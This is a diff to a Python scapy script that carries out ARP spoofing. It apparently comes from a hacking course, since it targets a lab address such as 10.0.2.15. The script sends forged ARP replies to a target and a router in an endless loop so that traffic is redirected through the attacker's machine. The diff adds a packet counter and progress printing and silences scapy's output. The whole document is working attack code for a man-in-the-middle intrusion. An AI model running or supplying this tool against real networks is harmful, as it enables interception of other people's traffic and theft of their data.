@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 target_ip = "10.0.2.15"
 target_mac = "08:00:27:70:92:1d"
@@ -27,10 +28,15 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
+sent_packets_count = 0
 while True:
     spoof(target_ip, router_ip)
     spoof(router_ip, target_ip)
+    sent_packets_count += 2
+    print("\r[+] Packets sent: " + str(sent_packets_count)),  # python 2
+    # print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # python3
+    sys.stdout.flush()
     time.sleep(2)
